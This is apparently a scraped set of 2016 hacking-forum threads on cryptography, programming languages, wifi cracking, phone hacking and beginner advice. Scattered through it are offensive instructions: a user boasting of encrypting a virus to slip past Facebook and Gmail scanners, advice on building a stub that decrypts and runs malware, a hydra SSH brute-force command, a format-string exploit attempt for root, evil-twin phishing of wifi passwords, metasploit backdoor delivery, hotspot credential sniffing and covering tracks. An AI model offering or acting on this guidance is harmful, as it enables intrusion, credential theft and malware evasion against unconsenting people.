I am neutral in this regard. I have created my own implementations as well as I have implemented the standard ones. IMHO What more important is understanding the theory and logic behind the encryption scheme. Simply blabbering out a few rotations in alphabets or switching the character positions, I wouldn't called this an encryption algorithm. But yeah the fact remains that these things do help you to sharpen your mind and think in a little different way, it should be noted here that I support this construct taking into consideration that the programmer has respect for the techniques already established and he/she has studied them to some extent and knows the math behind them.   So here's what I did earlier:   1. Grabbed a book of Cryptography [Cryptography and Network Security by forouzan]  2. Studied the Required Modular Arithmatic.  3. Read all the previous techniques like Playfair, Caesar Cipher, Transpositional, Railfence etc.   4. Implemented them.  5. Hacked Them    6. In the later chapters you will find Symm. and PKI which are much more difficult. For them I went on and joined Cryptography I course on coursera by Dan Boneh. Study from the Videos, Solve the exercises and you will see very interesting things and not everything created was a standard algorithm     I think following a similar approach would be be quite interesting because once you know the theory properly you will have the knowledge to defend yourself.    Good Luck.
What he's doing is taking each char sized chunk from a file and doing modulo 6 on it before re-writing. It's not a very good encryption scheme but I echo Katheudo's sentiments.    Good job OP. Keep up the good work and keep coding better and better encryption routines. While things like this may not be extremely useful for some, this also serves as a basis of encrypting blocks of data which can be leveraged in malware to encrypt your payload within a stub. If things like this interest you, you should look into learning the PE header and implementing a basic PE stub that finds the beginning of the malware data, decrypts it, and runs it.
Thanks everyone for commenting, I got lot of new ideas on what to and what not to. I just posted this simple encryption technique so that new programmers can understand the technique of how simple encryption is done.    I made this encrypter and decrypter to encrypt a file which facebook, gmail were not allowing me as it was contaminated with virus. So, just using this code I encrypted the virus and send it to one of my friend. Due to this facebook and even google couldn't detect it as virus.

If things like this interest you, you should look into learning the PE header and implementing a basic PE stub that finds the beginning of the malware data, decrypts it, and runs it    Allow me to provide proof for your statement:   Obfuscated Messages with custom encryption scheme:  http://image.prntscr.com/image/91cafe902b5741ba8ad48f53f74ad5bb.png  Decryption Algorithm:  Code  public static String decrypt(String s1, Integer id) throws IOException {      String sx = "";      String sr = "";      Integer x = Integer.valueOf(0);      Integer x4 = Integer.valueOf(s1.charAt(0) - ’A’);      s1 = s1.substring(1);      while (s1.length() > 0) {          sr = sr + (char)((s1.charAt(0) - ’A’) * 25 + (s1.charAt(1) - ’A’) -              x4.intValue() - id.intValue());          s1 = s1.substring(2);      }      return sr;  }              .CodeMirror {height: auto;}      var element = document.getElementById("code-cAgJVbV9qj");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "text/javascript",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });        The above is from a real jar malware.
While the above is more about obfuscation and I'm talking more about things like MOVfuscator and UPX, the same applies that depending on your adversary, sometimes you need only to obfuscate some strings to get past signature based AV and the like

You're in a forum about hacking, so you're already in a hacking community. Now all you have to do is read the things in this forum and find your own path.  "Hacking" is a broad field, the first thing you have to do is discover what options are there, what can you do as a "hacker", the subforum names are already a great tip by themselves, after you have a better picture in your head of what is possible to do, decide on what is it that you want to do, and do it. Nobody can tell you what is or isn't good for you but yourself, there are a gorillion posts about this same subject, try reading them and learn from their answers.   The big advantage of being in a forum is the possibility of learning from other people, this isn't facebook or twitter, you don't have to be the center of attention to get the answers you want. Somebody already asked this exact question, search for that question and if you're interested in knowledge, learn from them.

No i did, it just kept coming up with facebook exploits, which the user wasn't vulnerable too.

Hey, thank you for your question  Real quick, before I get to the answer, could I ask you to please rename this topic to something a bit more descriptive like "Base64 and Space Characters".   Spaces are in fact encoded, as are CRLF. It takes every byte and converts it from base16 to base64 and moves along adding padding where necessary. Base64 was invented to take binary data and represent it in ASCII printable text.
Done, thank you for answering my question. I was going to post a question yesterday about where to learn Base64 since I didn't find a tutorial on the tutorial section but I knew I would get sent to Google so I went there first. Only the spaces I wasn't sure about after the tutorials I read. Spaces are never mentioned.
And even when google has thousands of tutorials, it won't kill to practice your tutorial writting skills if you write that Base64 tutorial and save others the google trip.   Not necessary but good for you.

Administrative control on a windows server really doesn't mean much if you aren't part of the Domain Users/Domain Admins usergroup. Credentials are going to be stored on the Active Directory server so you'll need a Domain User/Admin in order to query it.    You could attempt to dump the hashes from the computer you currently have Local Admin on by using Volume Shadow Copies but it may not net you nearly as much as you'd like.

Hey man so I want to be a pro hacker and I know that doesnt comes over night so I need to do all this things? I mean I have free time and I meant I need to do just this?
Yes these are the main steps. After learning these things everything else will be a lot easier and simple.  You could also read some books and watch some videos.
Of course, and thanks! I want to be a good hacker, and also what pages for learning to hack would you recmend me? Thanks anyway!
Main simple steps. Good article.
So simple man, thank you
and the first step to be a programer?

This is one of those threads that needs to be locked. Read, studied and not discussed.    Is it just me or does it also annoy you seeing nothing but a bunch of one liner replies from single post users?                       Edited by 0E800 (Friday 4th of November 2016 04:03:37 PM)

I know this question is the most common one out there : How do i crack a wifi?  Well,  it is asked so much for a good reason.  (  please dont reply with things such as : "what do you mean exactly ?"... its simply lame.. you got my question )    I have checked a lot for such documentation which actually works and is not updated.. even paid for some courses which were completely useless at the end, due to the fact the softwares were updated or the routers got stronger for such attacks.    I am not asking you write me this command and magically it works, but some proper places to be able to understand the principle of breaking wifi and actually learning..  not the same old brute force youtube videos or reaver which dosent work..    Thanks a lot !
Cracking wifi is simple : Get the WPA/WPA2 handshake and run it through a WPA cracker such as pyrite. I hope you have a powerful CPU and a good wordlist
if it was so easy... where i am the default pass is 26 alphanumeric.. and it takes time........ no other way?
WPS attacks died the second they came out and cracking is really the only other way.
thanks. this removed lot of confusion from me.

You can use this tool called Fluxion https://github.com/deltaxflux/fluxion to capture handshake and then choose among a bruteforce attack, dictionary attack and a phishing attack.    My suggestion is you use the phishing attack.    What it does is, it deauths a specified or all the devices from the network and creates an Evil twin access point with a phishing page. When the victim enters the password, it'll be bruteforced against the handshake.    The best part is, you can make your own phishing page!

Most users have their ISP / Cable provider do the initial installation and might not even know what their wifi password is. Hint: Comcast keeps the wifi password on the bottom of the cable box.

Hmm looks great ! ive heard about this method and tried it on my phone, but the problem is that it looks strange to be asked for password again.. unless you are in a place with people who are not that aware of Internet stuffs...    Thanks for the info !

While it is possible someone _has_ done it, the chances of someone _currently_ doing it are very, very small.
I'd recommend you to use Wifite. I've cracked all sorts of Networks with this (WEP, WPA, WPA2) that had WPS enabled (except from WEP).   Wifite is fairly easy to use, and uses aircrack-ng, reaver, and all the Wi-Fi Cracking tools for you.   Check it out:  https://github.com/derv82/wifite  http://tools.kali.org/wireless-attacks/wifite

I use HT-WPS Breaker to hack wifi... It really works but only if wps unlocked.
Quote by VNX   only dump people with lack of knowledge about computer or networking would submit the password on the form, that is phishing all about   Well, it all depends on how good you make the login page look like. Yes, I agree with you, only dumb enough people would submit the password on the form. That's what phishing's all about, it would make the process much easier if you deauth the person who is dumb enough to enter the password in the login page.   And only the people who are dumb enough, would have a password worth bruteforcing.
While I do think that most people will keep themselves away and wonder why such page asking for network's password is there, there may still exist lots of people who don't recognize such events as attacks.   I was wondering if some of my friends and familiars wouldn't insert the password anyway and follow along with their lives unaware of being victims of phishing.

Why would you want to patch user32, it's a system dll.   You should probably inspect the code that calls into user32.

Dear SupremeNoob,   Being untraceable and hacking dont exactly fit together. You can make it extremely hard for someone to trace you, but to the point that they cannot find you is extremely hard. Firstly, as you said yourself a VPN is a good option. If you have a problem choosing a secure and safe VPN, check out this chart (https://thatoneprivacysite.net/vpn-comparison-chart/). Secondly, a virtual machine is like a whole new operating system, but it does not create a impermeable wall between your main OS and your Virtual Machine. Thirdly, using the WiFi in a bar, or someplace will make it very easy for you to get caught. The reason for this is because Bartenders are people that recognise faces and if you go there with a laptop and try hacking something, you will be remembered as you stick out. And as for doing the "Attack". I sincerely hope your not on about DDOS attacks, as their not exactly stellar hacking tools. Fourthly, their is a difference between a VPS and a VPN. A vpn is a secure encrypted connection and a VPS is a virtual server.   Finally, if you really want to hack without leaving a trace, check out this link (http://null-byte.wonderhowto.com/how-to/hack-like-pro-cover-your-tracks-leave-no-trace-behind-target-system-0148123/). It explains how to delete logs and other files etc.   Thanks,   Ant  An Aspiring Security Enthusiast   P.S By the way dont go crazy with throwing away PC's. An experienced hacker can find data on RAM, which is known to be volatile. And even formatting a hard drive isn't the best option for removing data. Don't forget about encryption, using a verified and strong encryption standard can help you in many ways. (AES 256 is a good choice)

The DNS Server 193.95.66.10 appears to be in Tunisia.   Its possible that the firewall is blocking port 80? Maybe check security settings.
193.95.66.10 reserved for the Education minister.   I'm sure that the firewall is not blocking port 80 because other devices have Internet connection. I had physical access to the building and saw someone searching for something on Google. He's using a Windows machine connected with a LAN cable to the router.

http://www.learn-c.org/  http://www.cprogramming.com/   Hi there,    Please try to use the two above sites as a reference to start. In my opinion you should only use them for language specifics...i.e. Day 1 learn program structure; Day 2 learn control flow; Day 3 learn language specific functions(i.e. if you were using C++ how to do inheritance).   Also I believe that C should be a formless language...code it the way you see fit - though this is not as simple as it is said in the beginning...so a good place to start is by looking at the code you have on your machine(I am assuming you are running some Linux distro). this would be a very good place to start - this is in fact how I learnt : copy-> understand/comprehend->change/innovate-> teach-> master. Linus Trevold is indeed a smart man as are many others that you will find whose code you will read - just don't make the mistake of treating them as Gods; instead walk in with a mindset that you will challenge the "current way" of things(ironically this will lead you to writing programs that goes against what they do and will commonly be of lower quality - which will lead you to researching why and ultimately understanding the true intent behind their each keystroke).   P.S. I have always experienced and seen that having circuitry knowledge to be very beneficial and or an advantage
There is also a very nice book...I need to try and dig through my closet to find it...I know it takes a more mathematical approach to it...which I found more helpful than those sites....ill try and find it. But its been a while.
CS50 is an online course from harvard, it's free. It's the best introduction i can think of for C, google it.  The book "C primer plus" goes well with the course.
@Selthar,   I audited this coarse for free on EDX for free - and I wanted to come here and say thank you - its a great coarse that goes beyond just a language.     It also helps you brush up on languages such as PHP and SQL. Very handy and I would recommend this to anyone who is relying on tools for their hacks, because I know that most of the time people rely on hacking tools even when they understand the logic behind the attack as they do not know how to develop their own from a coding point of view (I'm referring to the beginner hackers here). You can just skip through the coarse to what you need...so its perfect for people who have done absolutely nothing with computers to people who have been obsessed with computers like a little geek for their whole life.    Again Selthar - thank you it has helped me.

You study networks, find common flaws in networks then apply those principles. If you want a step by step tutorial you're not in the right place.
have you ever use metasploit yet?  If yes, you just have to set the lhost to your ddns hostname , then send the backdoor to the target, make sure he/she executed, and boom you're in

Running "hydra --help" would have helped you faster than me...   Whatever, the "-p" option is used to specify a single password instead of a password file.  If you want to specify the used port you have to use the "-s" option.   Your right command would be: Codehydra -l root -P "path/to/password/file.txt" -s 2200 {IP ADDRESS} ssh            .CodeMirror {height: auto;}      var element = document.getElementById("code-1zgiHSuESd");     var editor = new CodeMirror(function (elt) {       element.parentNode.replaceChild(elt, element);      }, {      value: element.value,      mode:  "text/javascript",      theme: "ambiance",      lineNumbers: true,      styleActiveLines: true,      matchBrackets: true,      readOnly: true,      lineWrapping: true     });              Edited by rasoapid (Sunday 23rd of October 2016 08:46:08 PM)

Dear Evil Zone Community,   It is my first post, so apologies if I have posted in the wrong thread or something. I wanted to ask whether Black Hat Hackers are all they are made out to be? It seems like Black Hat hackers are truly heartless and well I have to say I do agree based on impressions. The reason for this is well I got doxed and I know who it is and why they did it? But it just seems so wrong and a ruthless action. Why would you hack an innocent individual? I get it that you may want the monetary benefit, but dont, Black hat hackers feel guilt?   Again sorry for the question. I just wanted to ask.   Thank you,   Ant  An Aspiring Security Enthusiast
You're looking at generally script kiddie level blackhats. Real, criminally motivated blackhats don't give a damn about dox'ing you, they are too busy hacking companies for extortion.
Some do, others don't. "Hackers" are just people, there isn't a "black hat" race like you would have an orc or an elf. You have people, these people have different personality traits and different reasons to take their actions. Some of them become hackers, some don't. Some are ruthless, some are not.

Thanks for the replies,   I honestly thought no one would reply. Selhar's reply interests me most because if their is not a black hat, white hat or grey hat like I would normally think. Then how do you separate the good from the bad? Your post really got me thinking because if hacking really is less about boundaries, personalities and beliefs then the question in my mind is; Where is the buzz of hacking that is so dramatised? You see it often in Mr Robot etc.    Thanks for  the replies

Plus every hacker will have their own motives as well, whether they do it for money, fame or just the pure thrill. Motives will push different outcomes.                       Edited by Katheudo (Tuesday 27th of September 2016 11:05:20 PM)
(T/F) Its illegal to access a system without the system owners or network administrators permission.   White: True, no doubt about it.  Gray: I know this is True, but ... there are times when I had to ... bla bla bla.  Black: My eyes see what they see. I do what I want, bitch.    "Lets take advantage of recently divulged vulnerability before the holes are blocked."   White: No fucking way, and I am reporting this forum to nerdsquad.  Gray: Ill do it a couple times, need to test out my VPN.  Black: I already have a website up on TOR accepting bitcoin for the ransom dropper.   What is a hacker?   White: Someone that leverages technology to find bugs and patch vulnerabilities.  Gray: Someone that leverages technology by any means necessary to achieve a goal even if it means bending rules.  Black: Someone that leverages technology illicitly for monetary gain or to create panic, chaos, shits and giggles.   Just my opinion.   Hats are just buzzwords for people who don't know shit and try to put a color to a name.
As the last post stated very clearly, hackers have different forms but all of them are people. So philosophically speaking a really kind person can be a great Black Hat hacker on his spare time cracking systems, DDOSing websites and so on. But my belief is that usually people who have a problem with the world around them, become the greatest of hackers. So the thing is that if you learn the way they attack you and implement Security then you can be safe at least for a time.

Quote by Katheudo  A good example of people having a problem with the world is Mr.Robot ;D If you have seen it...   I have seen it of course. It was a good made series about hacking. Unlike other movies of the same example like: A Girl with a Dragon Tatoo, which again shows us that people who have a problem with the world make great hackers but the movie was like not so computer-oriented. But otherwise there are people out there, black hats who hack just to make money. For example that recent hack on Yahoo, which almost revealed the whole system's accounts, was like a gold-mine to black-hats. Because an email account sold online could make at least 20 $ each.                       Edited by nickth9 (Wednesday 28th of September 2016 03:34:48 PM)
It makes more sense for a whitehat to become a blackhat then someone with no computer experience learning just enough to do blackhat stuff.   Whitehat gets fired or wakes up one day and decides to go offence on their competitors. Whitehat lives in 3rd world country and hates America and government supports his actions.    Whitehat develops an addiction for drugs and prostitution and wants to stay in the high life so writes code to embezzle information or does corporate espionage on the side.   No one is immune from corruption. Everyone is tempted when no one is looking.

@0E800 You're right. A career whitehat will have all the know-how, as well as the insider knowledge to make their job a lot easier (in most cases) and probably safer. I'm sure this happens more often than the 'good side' of the sec industry wants to admit.   Also, I'm reminded of a quote that I read a long, long, time ago. I'm not quite sure from where, but the idea always stuck with me. Generally, people get caught committing crimes because the crime is usually out of necessity, and as a result, ill-timed and poorly planned. Think 'guy from the hood knocks over a convenience store'. It's brutish, risky, and has a poor return. That's in stark contrast to a crime being in auxiliary, where one can take their time and plan accordingly.   Edit: Just now noticing this is page two and 0E800 isn't the OP, so I'm not sure how relevant any of this is to the actual thread.

I guess no one has an answer for this or don't want to answer
Ok, so a long time ago, some random guy came up with this suite called DNSSEC which is implemented across every root DNS server, and most ISPs across the internet. So, the reason nobody is offering you help is because what you want to do will 99999/100000 times not work on any major DNS zone. DNS services within LAN implementations are really the only zone you will ever be able to pull off DNS poisoning aside from self-ran servers in third-world countries where CompSci education is basically non-existent (i.e. Kenya, Nigeria, etc).   In the areas you will most likely succeed, I recommend taking a look at ettercap (an ancient LAN/MITM attack tool), which as of the late 2000's has a plugin for DNS poisoning. If you really understood DNS, you would have already known this. Next time you want to tout about how fucking awesome you are with DNS, do some fucking research.

A 4GB drive is probably enough, but given the cost of flash drives these days, you might as well pay the extra five bucks and get a 16 gig.   USB install documentation here.         Edited by zenith (Monday 17th of October 2016 01:58:22 AM)

cybrary.it has many videos and is free.    https://www.cybrary.it/
Besides cybrary, as previously mentioned, the only free resources i can think of are  http://howto.hackallthethings.com/2016/07/secure-c-101.html http://opensecuritytraining.info/Training.html http://www.learnerstv.com/Free-Computer-Science-Video-lectures-ltv578-Page1.htm   There are a few more but it's too much trouble to cherry pick it, there's a post in the tutorial section listing all of it, just go there click everything and select whatever suits your needs.
http://www.securitytube.net/    Absolutely one of the best.

I would like to have that resource also...  I found this link, but it isn't redirecting.  The programmer's contact info' can be found here, apparently. Maybe he can be emailed directly.

For malware there's no right or wrong in my opinion, I even see Java malware being used these days. It can be written in anything from Python, Bash, PHP, whatever fits your use case.   Both C and C++ are good, I haven't dived deep into C other than having coded basic stuff. But what I can tell you about C++ is that it is amazing once you have reached a point where you can see the whole picture.   One thing I really like about C++ is the whole idea about templates & generic programming.   I haven't seen such features in other languages but implementing your own datastructure that makes use of such techniques is fascinating. Also C++ allows you to manage your own memory on the heap, so you have more control compared to a higher level language like Java where the garbage collector is in charge of memory management.    But C is a much simpler version of C++, I haven't had much experience with it to really comment on it.    C++ has a bigger learning curve than C in my opinion, so If you are not prepared to invest much time towards it C might be a better choice. But if you at any point in time want to get into software development professionally C++ can be a valuable skill to have. Especially, in the gaming industry.

Quote  I've been coding with C for about 6 months but recently I've listened some people claiming that C++ its a lot better. I was just curious about your opinion. I've been thinking about introducing myself into C++ .  Thank you.    There's actually no language that can be considered better, it all depends on what you plan to do with it (use case).   You can do in C pretty much everything you can in C++.   But from what I know / understand...C came first and later new concepts like Object oriented programming (classes, inheritance, concept of data encapsulation), generic programming, etc. were being thought of and such features were not available in C therefore C++ was developed to have such features and at the same time be backwards compatible with C code.   This is what I think or I have been told. C was developed at a time when computers were hardly available to the general public, building computers were more expensive than hiring a programmer to code on it. So priority was given more on running code that can run as fast and efficiently as possible. In terms of pure performance, C is pretty fast compared to a lot of other languages.   But now a days, the salary of a programmer is a lot more expensive than buying a few new computers, therefore we need to consider and give priority to programmers time than just having something run as fast as possible. We want to make use of code reuse in order to cut down programming time, this is where features of C++ fit in. You can develop libraries with detailed interface specification, and someone will not have to know how it works internally in order to make use of your library and he can easily extend it if he wants to.   I'm not saying that C isn't used anywhere, from stuff like developing operating system kernel, drivers, etc. where you want to have something running as fast as possible C is definitely a good choice. You can code it in C++ as well, but it is easier to make mistakes in C++ than C according to Linus Torvalds, which is why he chose C over C++ for developing Linux Kernel.   But actually it doesn't matter what language you use, initially when I was a beginner that's what I thought as well. Learning a new programming language won't necessarily make you any better than the other programmers.   What does matter is to understand core computer science concepts like Data structure and Algorithms. When you understand these concepts you can analyze the algorithmic efficiency of a particular piece of  code, and write code that would be leaps and bounds faster than others. That in my opinion is something that would help you stand out from the other programmers.             Edited by f474a (Thursday 13th of October 2016 06:53:50 AM)
IMHO, C++ is of course better, but there is just something sexy about C which C++ lacks (It's hard to describe, but you will find that sexiness when you use C a little bit, instead of just looking at it and saying eww, like I used to). It's the same reason people drive old-timers, even though a new Tesla Model S would be 100 times better. It just ain't the same.

hmm personal opinion i would say C is a million times better. But you are not looking for an opinion...so here is what i can say:   C is procedural...C++ is object orientated. Object orientation was created to address complexity in code through design - it achieves this through its constructs. But this in no way makes it a superior language but rather a preferred one. I would say superiority is circumstantial ie. as much as i would love to say that the world should revolve around C...it sometimes is plain silly to use it in quite a few hacks...as it takes from the user more than it would give - such as development time - so python usually comes out on top...or perl if you wish for rapid payload delivery from command line.   However if you are writing equations to  evaluate a deciphering equation for some encryption (equation run time) or even the encryption equation itself...C is your goto as it allows you a more intimate relationship with the metal and to squeeze out as much from its resources as possible from a high level language. Also when you start playing around with multi - paralleled processing and attempting to use quantum mechanic's theorems in it...again C would be your goto - but often you would find yourself needing to embed assembly if your are really desperate...or move away from commercial chipsets like INTEL. Cryptography tends to use principals of quantum mechanic to solve new issues...things like "it would take too long to crack with brute force" become "if we could implement this...would it really still take too long?"     So again it all depends on what you are doing...but from my personal opinion i have never truly seen the advantage of object orientation - perhaps i will as i endeavor through the computational world but as it stands...nope.   That being said i will close with saying that it is mandatory to learn both languages...as well as many others...so you have not wasted any time spent on them.   I understand that your are interested in malware...but malware from my understanding can be applied to many different computaional areas...so hence my broad topic above.

Quote by niloC is procedural...C++ is object orientated.   So what are you saying, that people don't do object oriented programming in C? I highly disagree... It may look different syntax wise, but you work with objects just as much in C. Object oriented programming is only one of the paradigms for both languages.

Those process names does sound slightly suspicious. But I quick google search tells me that they might be valid system processes too. I would suggest you find the executable files, upload them to virustotal and see what that tells you. You should be able to find them with any of the tools you mentioned. If you get 0 detections, this is most likely a case of mistaken malicious activity. Perhaps your computer is trying to download or install updates?   PS: This does not sound like a rootkit. A rootkit is a kernel-level backdoor. And in most cases they will hide from resource monitors.                       Edited by ande (Friday 14th of October 2016 09:13:54 AM)

I was thinking about the way i ran my debug:   -------------------------------------------  (gdb) r $(printf "\x22\x9f\x04\x08\x20\x9f\x04\x08")%49143x%11\$hn%14029x%12\$hn  -------------------------------------------  I dont think gdb will generate the true string there(perhaps the linux macros do not fall through)...so its possible that thats the reason why the __DTOR_END__ is staying null.   But the problem is that i still don't get root access -- perhaps i should check the shellcode i am using...though i need to first verify if i am really overwriting that location. Surely i could modify the scripts i am running to check after i overflow it...the check would run if the location is incorrect but wont run if the shellcode is run(location correct) . Will start on that tomorrow. If you have ideas please do post.

Android Dev.  IOS Dev.   Might help to have a few Android and iPhones to test.   For iPhones you really want to get control of the users iCloud account.  For Android you will want to get control of the users gmail account.   So what are you trying to do?     Bundle RAT with pirated Android APK?       - Most likely will only work on 'rooted' Android device      - Still requires the user to be tricked into running your version instead of downloading App from Store.   Others might have more experience with this.   Great that your learning c# and c++ at the same time. Try not to burn yourself out.   Might be worth while to review:  http://droidjack.net/ https://www.symantec.com/connect/blogs/remote-access-tool-takes-aim-android-apk-binder https://blog.lookout.com/blog/2015/07/10/hacking-team/   Good luck.
As you asked what am i trying to do: i am going to try hacking my own phone at start without downloading any files for it, i want to do everything manually, mostly to gain skills and experience as for what will i need to do, to gain acces to any phone. Then i will be willing to write a program for android that will do it for any phone connected to my internet (as i share my internet a lot using hot-spot), yep, that's my goal for now. Later on i will be willing to learn some defensive stuff, to help my friend protect her from her agressive script-kiddo neighbour.    Also, thanks for links, i will check 'em out right away          Edited by kassumi (Wednesday 12th of October 2016 09:11:43 PM)
It doesn't work like that. Your best bet would be to setup a MITM with hopes that you would be able to sniff out passwords in plain text coming from the users connecting their phones to your access point.   Practice by trying to access your own Gmail or iCloud account from another computer. See what happens, see what damage you could do and what kind of security procedures are in place to prevent it.   You wont be able to make a program to hack a phone. The phone needs to be prepped to be hackable in the first place. Hence the reason why going after the users account credentials is the best way to get access.

Might be worth while to review:  http://droidjack.net/ https://www.symantec.com/connect/blogs/remote-access-tool-takes-aim-android-apk-binder https://blog.lookout.com/blog/2015/07/10/hacking-team/   Good luck.
As you asked what am i trying to do: i am going to try hacking my own phone at start without downloading any files for it, i want to do everything manually, mostly to gain skills and experience as for what will i need to do, to gain acces to any phone. Then i will be willing to write a program for android that will do it for any phone connected to my internet (as i share my internet a lot using hot-spot), yep, that's my goal for now. Later on i will be willing to learn some defensive stuff, to help my friend protect her from her agressive script-kiddo neighbour.    Also, thanks for links, i will check 'em out right away          Edited by kassumi (Wednesday 12th of October 2016 09:11:43 PM)
It doesn't work like that. Your best bet would be to setup a MITM with hopes that you would be able to sniff out passwords in plain text coming from the users connecting their phones to your access point.   Practice by trying to access your own Gmail or iCloud account from another computer. See what happens, see what damage you could do and what kind of security procedures are in place to prevent it.   You wont be able to make a program to hack a phone. The phone needs to be prepped to be hackable in the first place. Hence the reason why going after the users account credentials is the best way to get access.
The image it self is not blocking you from facebook and honestly I doubt it's even possible that this will get your account blocked.   Edit: Glad you liked my Insanity Meowlf                       Edited by x_X (Tuesday 4th of October 2016 07:10:23 PM)

Edit: Glad you liked my Insanity Meowlf   Does your Meowlf have any secret message in it? I've watched a tutorial about how you can hide a message in a picture, but, anyone would be able to decrypt it with that tool(cybernescence). I don't really know much about steganography. Can we set a password for the message in an image and can we bruteforce it?
My image is just an image. While you can add stego to images and encrypt the message with a password, it tends to be fairly obvious that an image was tampered with if you start doing forensics on it
Maybe some kind of xss.
Its most likely a cross site request forgery, A.K.A CSRF.
The problem is the CSRF is not the only thing that could have been hidden in the image. The attacker could have added shell code and a self replicating script to it.

Most of this data is going to be SSL encrypted first and foremost so sniffing remotely is going to cause issues. This means that unless you set your phone to use a particular proxy to a machine running wireshark/burp/a generic proxy you won't see much.   Secondarily, many apps use Oauth as part of their authentication routine, especially if you have to use something like Facebook in order to create an account.

Out of the two you suggested I personally would start programming in python.  Just my personal opinion though. C, though being considered a high level language, is very low level and has much, much less abstraction than python does.  I have heard it being called "portable assembler".  You will be spending much more time on careful manual memory management (ensuring your resources are properly freed in every possible scenario) and implementing things from scratch.  This is something python will automagically take care of for you.  Python has many, many useful modules for pretty much any scenario (read: libraries).  I am quite sure that a beginner would enjoy learning python more than learning C.  Note: while python code is likely to be 10 times shorter than C code and you might work 10 times faster in python, C will definitely execute 10 times faster (the numbers are just an example).    Additionally, I would suggest to use C++ (if python does not satisfy your needs), unless you have a specific reason you need C.  The reason is that C++ is pretty much (there a a few exceptions I think) a super set of C.  However, it introduces many abstraction mechanisms and paradigms C "lacks", most notably generic programming and object oriented programming (+ RAII).  This doesn't mean that C++ is easier to learn than C.  I would say quite the opposite is true.   Why don't you just get your feet wet with both and decide for yourself.   At this point, despite me already having answered your question, I must suggest you google more thoroughly before starting a new thread next time. This is only the 1.000.000th time this question has been asked (in one way or another), and you waste everyone's  time asking the same questions over and over again, even if all I do is read your post.

@ScientiA, Thankyou for the detailed explanation.

Forgive me.   @CodeIllusionist, Hey, I thank you for correcting my grammar. The motivation is real    @shady, Simple, and really nice answer without going deep or anything. Thanks again.
I disagree and agree with all that has been said. Ilearnt C++ before I went to any other language and though I met a lot of disappointments, I totally loved my choice.  The only challenge would be not being able to think like a programmer yet hence a lot of concepts being hard. But persistance, coffee, a lot of redbull and uncountable evening walks will get you through.   I would advise python like I normally so easily do but I am in the mood to wish you well. Given those choices, and knowing how much time you have, I would recommend C first. You really are going to end up learn both and more languages later but having a good solid grounding is much less headaches in the future. Python is the lazy way out of this, C is the serious way up this. Learn yourself some C, learn yourself some secure C coding and other languages will be apick in the bucket.   Conclusively, hadn't you given us choices, I would have advises you to learn your JavaScript well, learn yourself your PHP, code a lot of websites, own your own websites, secure them up more, and you would have yourself aal good premier into the hacking scene.one or so years later, you add on your C and pythons and blah blah

Short answer: You can't.  Long answer: The only way to "decrypt" an unsalted hash is to use a rainbow table. If you know the salt, you might have success with a rainbow table.
Quote by shadyShort answer: You can't.  Long answer: The only way to "decrypt" an unsalted hash is to use a rainbow table. If you know the salt, you might have success with a rainbow table.    Not at all true. You can easily generate salts and add them to wordlists or bruteforce attempts and still crack the hash. The main problem here lies in knowing how the hash was generated and the length of the salt. sha1(salt+password) is going to produce different results than sha1(password+salt) and without a strong cracking rig bruteforcing anymore than the full 5 character keyspace is going to be fairly time intensive.   How was this hash acquired? Was it from a forum? Do you know the sofware running on the site you got the hash from? These answers will greatly help in determining salt size and hashing algorithm

Just common sense. I can't think of anything illegal you could possibly do by accident, nothing relevant is easy to be done, and nothing hard can be done without proper study.

You posted a screenshot of a HTTP authentication prompt. That is not a vulnerability.
It isn't shameful to ask questions, however every single one of your posts makes it obvious that you haven't bothered even to read the forum's FAQ. You might be excited about hacking but you clearly have no idea what hacking even is beyond what you see in movies. Read the FAQ, do your own research, decide if this is really an area of interest to you or not, then study or don't.   Asking shallow, generic questions as if this forum owed you something is not the way to go, you've been a leech in every one of your posts, nobody likes that, and nobody will help you with that attitude.
Moved to beginners corner, didn't fit in general discussion neither in hacking and security.   About OP's question. That is essentially called basic authentication, and you are in luck because its not going over https. You best bet is to sniff off some credentials, Hehe. Good luck with that.

Dear all,           Several years ago I'm a layman of Network Security and System Security. Those days I got a bachelor degree of computer science. Those days I was a rookie and always bullied by those who are a little stronger than me. They always attack at my work platforms and code. Those days, I only work as a humble Java Junior Programmer. I have only knowledge of C/C++, Java, basic Assembly and some Advanced Mathematics.          But one day things going to change. I now say the main part of this story. I decided to defend for myself.            I started from pentesterlab, see https://www.pentesterlab.com/. After I studied all these courses and did most of these exercises, I got the basic knowledge of network attack and defense. During the study of pentesterlab, I also read the books as "TCP/IP Analysis and Troubleshooting", "Introduction to Network Analysis" and "Network Analysis Using Wireshark Cookbook" etc. I got the knowledge of analysis of basic network flow and trouble shooting of my daily network problems. So from then on, I started to use the tools such as netstat, Tcpview and Wireshark. I can diagnose what's wrong with my network and detect abnormal network flow.           Based on my knowledge of C and Assembly, I then read the famous beginners' hacking book: "Hacking the Art of Exploitation". From this I got the basic knowledge of the theory of system code leakage. Basically I can avoid my mistaking in coding and start to use antivirus software wisely as well as understand the basic principles behine them. Antivirus softwares are good thing, especially those mend system vulnerabilities(I say windows) for you. You'd better daily check your system security status by using them. They blocked more than 95% networks attacks, viruses and malwares for you. Most important of all, you have a basic understanding how they work for you. This is the turning point between me and those evil attackers.           Then I read the advanced book of "The Rootkit Arsenal: Escape and Evasion in the Dark Corners of the System". This give me the basic means tackle with rootkit attackers. This is where you dive deep into your system software and start to understand how they work. I think this is the point you are an insider of security now.           Factually now I have a master degree in Computer System Software Architecture though not Network Security or System Security. During my study as a master, I have read the source code of Minix and Linux 2.4 kernel.           I'm still studying other materials.             If any beginer wants to turn into an insider. Perhaps he can take the steps as mine. If you have any questions about the details in these steps. You may ask, we can discuss together.

Thank you for ur story, it should give a starting point for every beginner.
Quote by piratesailorDear all,               If any beginer wants to turn into an insider. Perhaps he can take the steps as mine.      Haven't you been having problems for months on being attacked by root-kits constantly?   In all that reading nothing sparked the "Hey maybe I should wipe my drives and start over, or do something different as seemingly I keep getting owned by root-kits?"

